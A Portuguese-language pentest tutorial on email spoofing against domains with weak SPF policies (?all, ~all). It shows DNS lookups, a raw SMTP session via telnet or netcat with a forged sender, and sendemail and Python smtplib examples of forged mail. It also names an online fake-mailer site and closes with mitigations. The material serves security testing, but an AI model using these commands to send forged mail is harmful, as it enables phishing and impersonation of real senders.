
# Spoofing de Emails

## Introdução

Em um **pentest** (teste de penetração), a capacidade de enviar e-mails falsificados (spoofing) pode ser uma ferramenta útil para testar a segurança de servidores de e-mail e sistemas de autenticação de e-mails. O **SPF** (Sender Policy Framework) é um mecanismo de autenticação que ajuda a prevenir spoofing, especificando quais servidores estão autorizados a enviar e-mails em nome de um domínio. No entanto, alguns domínios configuram seus registros SPF com políticas menos restritivas, como `?all` (neutral) ou `~all` (softfail), o que pode permitir o envio de e-mails falsificados.

Este guia mostrará como realizar testes de spoofing de e-mails em servidores que possuem SPF configurado como `?all` ou `~all`, verificando a vulnerabilidade do sistema.

## Entendendo o Registro SPF

O registro SPF é um tipo de registro **TXT** no DNS que define quais servidores de e-mail têm permissão para enviar e-mails em nome de um domínio. O registro SPF segue a seguinte estrutura:

```
v=spf1 <mecanismos> <modificadores> <qualificador>
```

### Principais Qualificadores de SPF:

- **`+` (Pass)**: Permite explicitamente o envio de e-mails (padrão).
- **`-` (Fail)**: Bloqueia explicitamente o envio de e-mails.
- **`~` (Softfail)**: Permite o envio, mas marca os e-mails como suspeitos (softfail).
- **`?` (Neutral)**: Não faz nenhuma verificação, permitindo qualquer servidor enviar e-mails em nome do domínio.

## Enviando E-mails Falsos

### Verificando o Registro SPF do Domínio Alvo

Antes de realizar o teste de spoofing, é importante verificar qual a configuração do SPF do domínio. Para isso, você pode usar o comando `dig` ou `host` para consultar o registro SPF no DNS:

#### Comando `dig`:

```bash
dig txt example.com
```

#### Comando `host`:

```bash
host -t txt example.com
```

Na saída, você verá o registro SPF. Exemplo:

```
example.com descriptive text "v=spf1 ip4:192.168.1.0/24 ip6:2001:db8::/32 ~all"
```

Neste exemplo, o domínio `example.com` tem o qualificativo `~all`, indicando que o e-mail será aceito com "softfail" (não falha automaticamente).

### Enviando E-mails Falsos Usando Telnet ou Netcat

Você pode usar **Telnet** ou **Netcat** para interagir diretamente com um servidor SMTP e enviar um e-mail falsificado.

#### Conectando ao Servidor SMTP

Primeiro, conecte-se ao servidor SMTP do domínio alvo usando Telnet ou Netcat. Suponha que o servidor SMTP esteja na porta 25:

```bash
telnet smtp.example.com 25
```

Ou usando Netcat:

```bash
nc smtp.example.com 25
```

#### Iniciando a Sessão SMTP

Quando a conexão for estabelecida, você pode começar a enviar comandos SMTP. Aqui está um exemplo básico de um fluxo de envio de e-mail falsificado:

```bash
HELO pentest.com
MAIL FROM:<admin@example.com>
RCPT TO:<victima@exemplo.com>
DATA
Subject: Teste de Spoofing

Este é um teste de e-mail falsificado em um pentest.

.
QUIT
```

- **HELO**: Apresenta o nome do cliente SMTP.
- **MAIL FROM**: Define o remetente (falsificado neste caso).
- **RCPT TO**: Define o destinatário do e-mail.
- **DATA**: Inicia a composição do corpo do e-mail. Termina com um ponto (`.`) em uma linha separada.
- **QUIT**: Termina a sessão SMTP.

Se o domínio alvo tiver o SPF configurado como `?all` ou `~all`, o e-mail pode ser aceito e entregue, dependendo das configurações do servidor de e-mail do destinatário.

### Testando Com Ferramentas Automatizadas

Ferramentas como o **SendEmail** ou scripts de Python usando a biblioteca **smtplib** podem ser usadas para automatizar o envio de e-mails falsos em um pentest.

#### Exemplo Usando SendEmail

Você pode instalar o **SendEmail** no Linux com:

```bash
sudo apt-get install sendemail
```

E enviar um e-mail falsificado da seguinte forma:

```bash
sendemail -f admin@example.com -t victima@exemplo.com -u "Teste de Pentest" -m "Este é um teste de spoofing." -s smtp.example.com:25
```

Neste exemplo, o e-mail é enviado com o remetente `admin@example.com` e o destinatário `victima@exemplo.com` através do servidor SMTP `smtp.example.com`.

#### Exemplo Usando Python (smtplib)

Aqui está um exemplo de código Python para enviar um e-mail falsificado:

```python
import smtplib

def send_spoofed_email():
    from_address = "admin@example.com"
    to_address = "victima@exemplo.com"
    subject = "Teste de Spoofing"
    body = "Este é um teste de e-mail falsificado em um pentest."

    email_message = f"Subject: {subject}\n\n{body}"

    server = smtplib.SMTP("smtp.example.com", 25)
    server.sendmail(from_address, to_address, email_message)
    server.quit()

send_spoofed_email()
```

Este script envia um e-mail falsificado usando o endereço `admin@example.com` como remetente.

### Usando um Fake Mailer

Os emails também podem ser enviados de sites que permitem o envio de emails falsos como o `https://emkei.cz/`. 

### Verificando o Resultado

Após o envio do e-mail, é importante verificar como o servidor de e-mail do destinatário tratou o e-mail. Dependendo do servidor, o e-mail pode ser aceito, colocado na caixa de spam, ou rejeitado.

## Mitigando Spoofing

Após descobrir que o domínio é vulnerável a spoofing, recomenda-se que o administrador do domínio faça as seguintes correções:

- **Atualizar o Registro SPF**: Mude o qualificativo `~all` para `-all`, o que indica uma política de "fail" estrita, rejeitando e-mails de servidores não autorizados.
  
- **Implementar DMARC**: O **DMARC** (Domain-based Message Authentication, Reporting & Conformance) ajuda a reforçar as políticas SPF e DKIM, especificando como os servidores de recebimento devem tratar e-mails que falhem na verificação.

- **Monitoramento e Relatórios**: Ativar relatórios DMARC permite que os administradores recebam feedback sobre tentativas de envio de e-mails falsificados em nome do domínio.